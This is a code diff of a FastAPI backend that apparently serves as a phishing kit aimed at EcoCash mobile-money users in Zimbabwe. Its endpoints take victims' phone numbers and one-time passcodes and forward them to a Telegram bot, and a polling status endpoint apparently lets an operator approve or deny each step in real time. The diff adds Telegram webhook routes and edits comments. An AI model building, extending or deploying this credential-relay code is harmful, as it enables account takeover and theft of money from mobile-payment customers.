@@ -67,6 +67,7 @@ async def lifespan(app: FastAPI):
 
 app = FastAPI(lifespan=lifespan)
 
+# CORS Configuration (Update this with your Vercel URL later)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"], 
@@ -81,7 +82,6 @@ async def initiate_login(req: LoginRequest):
     tx_id = str(uuid.uuid4())
     transactions[tx_id] = {"status": "pending", "type": "login"}
     
-    # ZIMBABWE CUSTOMIZATION HERE
     message = (
         f"🔐 <b>NEW ECOCASH LOGIN (ZIMBABWE)</b>\n\n"
         f"📱 <b>Phone:</b> +263 {req.phone}\n"
@@ -105,7 +105,6 @@ async def verify_otp(req: OTPRequest):
     tx_id = str(uuid.uuid4())
     transactions[tx_id] = {"status": "pending", "type": "otp"}
     
-    # ZIMBABWE CUSTOMIZATION HERE
     message = (
         f"🔢 <b>NEW ECOCASH OTP (ZIMBABWE)</b>\n\n"
         f"📱 <b>Phone:</b> +263 {req.phone}\n"
@@ -128,3 +127,27 @@ async def get_status(tx_id: str):
     if tx_id not in transactions:
         return {"status": "denied"} 
     return {"status": transactions[tx_id]["status"]}
+
+# --- WEBHOOK ENDPOINTS (CRITICAL FOR TELEGRAM) ---
+@app.post("/api/webhook/telegram")
+async def telegram_webhook(request: Request, x_telegram_bot_api_secret_token: Optional[str] = Header(None)):
+    if x_telegram_bot_api_secret_token != WEBHOOK_SECRET:
+        raise HTTPException(status_code=403, detail="Invalid secret token")
+    update_data = await request.json()
+    update = Update.de_json(update_data, ptb_app.bot)
+    await ptb_app.process_update(update)
+    return {"status": "ok"}
+
+@app.get("/api/webhook/set")
+async def set_telegram_webhook():
+    base_url = os.environ.get("RENDER_EXTERNAL_URL")
+    if not base_url:
+        raise HTTPException(status_code=500, detail="RENDER_EXTERNAL_URL not set")
+    
+    webhook_url = f"{base_url.rstrip('/')}/api/webhook/telegram"
+    try:
+        await ptb_app.bot.delete_webhook(drop_pending_updates=True)
+        await ptb_app.bot.set_webhook(url=webhook_url, secret_token=WEBHOOK_SECRET)
+        return {"status": "success", "webhook_url": webhook_url}
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
